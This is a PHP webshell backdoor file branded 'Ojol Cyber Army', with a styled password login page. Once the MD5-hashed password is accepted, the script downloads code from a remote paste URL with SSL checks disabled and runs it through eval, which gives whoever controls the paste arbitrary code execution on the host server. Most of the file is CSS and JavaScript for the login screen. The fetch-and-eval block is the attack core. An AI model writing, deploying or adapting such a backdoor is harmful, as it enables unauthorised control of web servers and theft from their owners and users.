<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Check if the password is submitted and correct
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '2fb7878cbf1c45bd7d36f3d5efe3624e'; // Replace this with your MD5 hashed password
    if (md5($entered_password) === $hashed_password) {
        // Password is correct, store it in session
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
        header('Content-Type: application/json');
        echo json_encode(['status' => 'success', 'message' => 'Berhasil Login' ]);
        exit();
    } else {
        // Password is incorrect
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'Password Anda Salah' ]);
        exit();
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo('https://paste.idcloudhosting.my.id/paste/xtyer/raw');
    eval('?>' . $a);
} else {
// Display login form if not logged in
?>
<!DOCTYPE html>
<html>
<head>
    <title>{ Login Shell }</title>
    <link rel="icon" type="image/png" href="https://i.ibb.co/0Mpp4F2/1688811750619.png"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap');

    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: 'Poppins', sans-serif;
    }

    body {
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        flex-direction: column;
        background: #23242a;
        margin: 0;
    }

    .box {
        position: relative;
        width: 380px;
        height: 450px;
        background: #1c1c1c;
        border-radius: 8px;
        overflow: hidden;
    }

    .box::before {
        content: '';
        z-index: 1;
        position: absolute;
        top: -50%;
        left: -50%;
        width: 380px;
        height: 450px;
        transform-origin: bottom right;
        background: linear-gradient(0deg, transparent, #45f3ff, #45f3ff);
        animation: animate 6s linear infinite;
    }

    .box::after {
        content: '';
        z-index: 1;
        position: absolute;
        top: -50%;
        left: -50%;
        width: 380px;
        height: 450px;
        transform-origin: bottom right;
        background: linear-gradient(0deg, transparent, #fa008a, #fa008a);
        animation: animate 6s linear infinite;
        animation-delay: -3s;
    }

    @keyframes animate {
        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }
    }

    form {
        position: absolute;
        inset: 2px;
        background: #28292d;
        padding: 50px 40px;
        border-radius: 8px;
        z-index: 2;
        display: flex;
        flex-direction: column;
        align-items: center;
    }

    h1 {
        color: #fff;
        font-size: 2rem;
        font-weight: 600;
        margin-top: 20px;
        margin-bottom: 20px;
    }

    h1 span {
        color: #fa008a;
        position: relative;
    }

    h1 span::before {
        content: "";
        height: 30px;
        width: 2px;
        position: absolute;
        top: 50%;
        right: -8px;
        background: #fa008a;
        transform: translateY(-45%);
        animation: blink 0.7s infinite;
    }

    h1 span.stop-blinking::before {
        animation: none;
    }

    @keyframes blink {
        50% {
            opacity: 0
        }
    }

    h2 {
        color: #45f3ff;
        font-weight: 500;
        text-align: center;
        letter-spacing: 0.1em;
    }

    h3 {
        color: transparent;
        -webkit-text-stroke: 1px #fff;
        font-size: 20px;
        background-image: linear-gradient(#0ef, #0ef);
        background-repeat: no-repeat;
        -webkit-background-clip: text;
        background-position: -600px 0;
        transition: background-position 1s, text-shadow 1s;
        transition-delay: 0.6s, 0s;
        margin-top: 20px;
        margin-bottom: 20px;

    }

    h3:hover {
        transition: background-position 1s, text-shadow 1s;
        transition-delay: 0s, 1s;
        background-position: 0 0;
        text-shadow: 0 0 10px #0ef, 0 0 20px #0ef, 0 0 40px #0ef, 0 0 80px #0ef,
            0 0 160px #0ef;
    }

    .inputBox {
        position: relative;
        width: 300px;
        margin-top: 20px;
        margin-bottom: 20px;
    }

    .inputBox input {
        position: relative;
        width: 100%;
        padding: 20px 10px 10px;
        background: transparent;
        outline: none;
        box-shadow: none;
        border: none;
        color: #23242a;
        font-size: 1em;
        letter-spacing: 0.05em;
        transition: 0.5s;
        z-index: 10;
    }

    .inputBox span {
        position: absolute;
        left: 0;
        padding: 20px 0px 10px;
        pointer-events: none;
        font-size: 1em;
        color: #8f8f8f;
        letter-spacing: 0.05em;
        transition: 0.5s;
    }

    .inputBox input:valid~span,
    .inputBox input:focus~span {
        color: #45f3ff;
        transform: translateX(0px) translateY(-34px);
        font-size: 0.75em;
    }

    .inputBox i {
        position: absolute;
        left: 0;
        bottom: 0;
        width: 100%;
        height: 2px;
        background: #45f3ff;
        border-radius: 4px;
        overflow: hidden;
        transition: 0.5s;
        pointer-events: none;
        z-index: 9;
    }

    .inputBox input:valid~i,
    .inputBox input:focus~i {
        height: 44px;
    }

    @keyframes button-loading {
        20% {
            color: #fa008a;
            transform: scale(1, 1);
        }

        40% {
            border-color: #45f3ff;
            background-color: #fa008a;
            transform: scale(1, 1);
        }

        60% {
            transform: scale(0.7, 1.1);
            margin-left: 1.25rem;
            width: 2.5rem;
            text-indent: -0.6125rem;
            color: #fa008a;
            border-color: #45f3ff;
            background-color: #fa008a;
        }

        80% {
            transform: scale(1, 1);
        }

        100% {
            margin-left: 1.25rem;
            width: 2.5rem;
            background-color: #fa008a;
            border-color: #45f3ff;
            color: #fa008a;
        }
    }

    @keyframes button-dot-intro {
        0% {
            opacity: 0;
        }

        60% {
            opacity: 1;
            transform: scale(1, 1);
        }

        100% {
            transform: scale(0.75, 0.75);
        }
    }

    @keyframes button-dot-pulse {
        0% {
            opacity: 1;
            transform: scale(0.75, 0.75);
        }

        15% {
            transform: scale(0.85, 0.85);
        }

        45% {
            transform: scale(0.75, 0.75);
        }

        55% {
            transform: scale(0.95, 0.95);
        }

        85% {
            transform: scale(0.75, 0.75);
        }

        100% {
            opacity: 1;
            transform: scale(0.75, 0.75);
        }
    }

    @keyframes button-ready {
        0% {
            margin-left: 1.25rem;
            width: 2.5rem;
        }

        10% {
            background-color: #45f3ff;
            border-color: #45f3ff;
        }

        70% {
            margin: 0;
            width: 7.25rem;
            background-color: #fff;
            transform: scale(1.1, 1.1);
        }

        100% {
            margin: 0;
            width: 7rem;
            border-color: #45f3ff;
            background-color: #fff;
        }
    }

    @keyframes button-dot-outro {
        0% {
            opacity: 1;
        }

        100% {
            opacity: 0;
            transform: scale(1, 1);
        }
    }

    @keyframes button-ready-label {
        0% {
            opacity: 0;
        }

        100% {
            opacity: 1;
        }
    }

    button {
        position: relative;
        overflow: hidden;
        width: 7rem;
        color: #45f3ff;
        border: 2px solid #45f3ff;
        background-color: #28292d;
        cursor: pointer;
        line-height: 2;
        padding: 0;
        border-radius: 1.5rem;
        font-size: 1.125rem;
        text-transform: lowercase;
        outline: none;
        transition: transform 0.125s;
    }

    button:active {
        transform: scale(0.9, 0.9);
    }

    button:before,
    button:after {
        position: absolute;
        opacity: 0;
        border-radius: 50%;
        background-color: #fff;
        top: 50%;
        left: 50%;
        margin-top: -1.125rem;
        margin-left: -1.125rem;
        width: 2.25rem;
        height: 2.25rem;
        content: "";
        z-index: 1;
    }

    button.loading {
        animation: button-loading 0.5s forwards;
    }

    button.loading:before {
        opacity: 1;
        animation: button-dot-intro 0.5s forwards;
    }

    button.loading:after {
        opacity: 0;
        animation: button-dot-pulse 1.5s infinite 0.5s;
    }

    button.ready {
        text-indent: 0;
        color: transparent;
        background-color: #45f3ff;
        animation: button-ready 0.333s forwards;
    }

    button.ready:before {
        position: absolute;
        left: 0;
        right: 0;
        top: auto;
        margin: 0;
        width: auto;
        height: auto;
        border-radius: 0;
        background-color: #28292d;
        color: #45f3ff;
        content: "login";
        opacity: 0;
        z-index: 2;
        animation: button-ready-label 0.5s forwards 0.275s;
    }

    button.ready:after {
        opacity: 1;
        animation: button-dot-outro 0.333s;
    }

    .wrapper {
        margin-bottom: 20px;
        display: inline-flex;
    }

    .wrapper .icon {
        margin: 0 20px;
        text-align: center;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        position: relative;
        z-index: 2;
        transition: 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
    }

    .wrapper .icon span {
        display: block;
        height: 60px;
        width: 60px;
        background: #fff;
        border-radius: 50%;
        position: relative;
        z-index: 2;
        box-shadow: 0px 10px 10px rgba(0, 0, 0, 0.1);
        transition: 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
    }

    .wrapper .icon span i {
        line-height: 60px;
        font-size: 25px;
    }

    .wrapper .icon .tooltip {
        position: absolute;
        top: 0;
        z-index: 1;
        background: #fff;
        color: #fff;
        padding: 10px 18px;
        font-size: 20px;
        font-weight: 500;
        border-radius: 25px;
        opacity: 0;
        pointer-events: none;
        box-shadow: 0px 10px 10px rgba(0, 0, 0, 0.1);
        transition: 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
    }

    .wrapper .icon:hover .tooltip {
        top: -70px;
        opacity: 1;
        pointer-events: auto;
    }

    .icon .tooltip:before {
        position: absolute;
        content: "";
        height: 15px;
        width: 15px;
        background: #fff;
        left: 50%;
        bottom: -6px;
        transform: translateX(-50%) rotate(45deg);
        transition: 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
    }

    .wrapper .icon:hover span {
        color: #fff;
    }

    .wrapper .icon:hover span,
    .wrapper .icon:hover .tooltip {
        text-shadow: 0px -1px 0px rgba(0, 0, 0, 0.4);
    }

    .wrapper .instagram:hover span,
    .wrapper .instagram:hover .tooltip,
    .wrapper .instagram:hover .tooltip:before {
        background: #e1306c;
    }

    .wrapper .github:hover span,
    .wrapper .github:hover .tooltip,
    .wrapper .github:hover .tooltip:before {
        background: #333;
    }

    .wrapper .youtube:hover span,
    .wrapper .youtube:hover .tooltip,
    .wrapper .youtube:hover .tooltip:before {
        background: #DE463B;
    }

    .notifications {
        position: fixed;
        top: 30px;
        right: 20px;
    }

    .toast {
        position: relative;
        padding: 10px;
        color: #fff;
        margin-bottom: 10px;
        width: 400px;
        display: grid;
        grid-template-columns: 70px 1fr 70px;
        border-radius: 5px;
        --color: #0abf30;
        background-image:
            linear-gradient(to right, #0abf3055, #22242f 30%);
        animation: show 0.3s ease 1 forwards
    }

    .toast i {
        color: var(--color);
        display: flex;
        justify-content: center;
        align-items: center;
        font-size: x-large;
    }

    .toast .title {
        font-size: x-large;
        font-weight: bold;
    }

    .toast span,
    .toast i:nth-child(3) {
        color: #fff;
        opacity: 0.6;
    }

    @keyframes show {
        0% {
            transform: translateX(100%);
        }

        40% {
            transform: translateX(-5%);
        }

        80% {
            transform: translateX(0%);
        }

        100% {
            transform: translateX(-10%);
        }
    }

    .toast::before {
        position: absolute;
        bottom: 0;
        left: 0;
        background-color: var(--color);
        width: 100%;
        height: 3px;
        content: '';
        box-shadow: 0 0 10px var(--color);
        animation: timeOut 5s linear 1 forwards
    }

    @keyframes timeOut {
        to {
            width: 0;
        }
    }

    .toast.error {
        --color: #f24d4c;
        background-image:
            linear-gradient(to right, #f24d4c55, #22242F 30%);
    }

    .toast.warning {
        --color: #e9bd0c;
        background-image:
            linear-gradient(to right, #e9bd0c55, #22242F 30%);
    }

    .toast.info {
        --color: #3498db;
        background-image:
            linear-gradient(to right, #3498db55, #22242F 30%);
    }
    </style>
</head>
<body>
    <h1>Webshell <span></span></h1>
    <div class="notifications"></div>
    <div class="box">
        <form method="POST" action="" onsubmit="handleLogin()">
            <h2>Sign in</h2>
            <div class="inputBox">
                <input type="password" id="password" name="password" required="required">
                <span>Password</span>
                <i></i>
            </div>
            <button type="submit">Send</button>
            <h3>{ Social Media }</h3>
            <div class="wrapper">
                <div class="icon instagram">
                    <div class="tooltip">
                        Instagram
                    </div>
                    <span><a href='https://instagram.com/ojol_cyber_army'><i class="fab fa-instagram"></a></i></span>
                </div>
                <div class="icon github">
                    <div class="tooltip">
                        Github
                    </div>
                    <span><a href='https://github.com/OjolCyberArmy/Ojol-Shell-Backdoor-'><i class="fab fa-github"></a></i></span>
                </div>
                <div class="icon youtube">
                    <div class="tooltip">
                        YouTube
                    </div>
                    <span><a href='https://www.youtube.com/@ojolcyberarmy'><i class="fab fa-youtube"></i></span>
        </form>
    </div>
    <script>
    const dynamicText = document.querySelector("h1 span");
    const words = ["Free By", "OJOL", "CYBER", "ARMY"];

    let wordIndex = 0;
    let charIndex = 0;
    let isDeleting = false;

    const typeEffect = () => {
        const currentWord = words[wordIndex];
        const currentChar = currentWord.substring(0, charIndex);
        dynamicText.textContent = currentChar;
        dynamicText.classList.add("stop-blinking");

        if (!isDeleting && charIndex < currentWord.length) {
            charIndex++;
            setTimeout(typeEffect, 200);
        } else if (isDeleting && charIndex > 0) {
            charIndex--;
            setTimeout(typeEffect, 100);
        } else {
            isDeleting = !isDeleting;
            dynamicText.classList.remove("stop-blinking");
            wordIndex = !isDeleting ? (wordIndex + 1) % words.length : wordIndex;
            setTimeout(typeEffect, 1200);
        }
    }

    typeEffect();

    document.querySelector('button').addEventListener('click', function clickHandler(e) {

        this.removeEventListener('click', clickHandler, false);

        e.preventDefault();
        var self = this;
        setTimeout(function() {
            self.className = 'loading';
        }, 125);

        setTimeout(function() {
            self.className = 'ready';
        }, 4300);

    }, false);
    </script>
    </div>
    </div>
    <script>
    const handleLogin = async () => {
        event.preventDefault();

        const password = document.getElementById('password').value;
        const xhr = new XMLHttpRequest();

        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                if (xhr.status === 200) {
                    try {
                        const s = JSON.parse(xhr.responseText);
                        let type = s.status;
                        let icon = '';
                        let title = s.status.charAt(0).toUpperCase() + s.status.slice(1);
                        let text = s.message;
                        if (s.status === 'success') {
                            icon = 'fas fa-check-circle';
                            setTimeout(function() {
                                location.reload()
                            }, 3000)
                        } else {
                            icon = 'fas fa-times-circle';
                        }
                        createToast(type, icon, title, text);
                    } catch (error) {
                        console.error(error);
                        let type = 'error';
                        let icon = 'fas fa-times-circle';
                        let title = 'Error';
                        let text = 'password anda salah';
                        createToast(type, icon, title, text);
                    }
                } else {
                    console.error('Request failed with status:', xhr.status);
                    let type = 'error';
                    let icon = 'fas fa-times-circle';
                    let title = 'Error';
                    let text = 'password anda salah';
                    createToast(type, icon, title, text);
                }
            }
        };

        xhr.open('POST', '<?php Echo $_SERVER["PHP_SELF"];?>', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

        const formData = new URLSearchParams();
        formData.append('password', password);

        xhr.send(formData);
    }

    function createToast(type, icon, title, text) {
        let newToast = document.createElement('div');
        newToast.innerHTML = `
            <div class="toast ${type}">
                <i class="${icon}"></i>
                <div class="content">
                    <div class="title">${title}</div>
                    <span>${text}</span>
                </div>
                <i class="fa-solid fa-xmark" onclick="(this.parentElement).remove()"></i>
            </div>`;
        document.querySelector('.notifications').appendChild(newToast);
        newToast.timeOut = setTimeout(
            () => newToast.remove(), 5000
        )
    }
    </script>
</body>
</html>
<?php
}
?>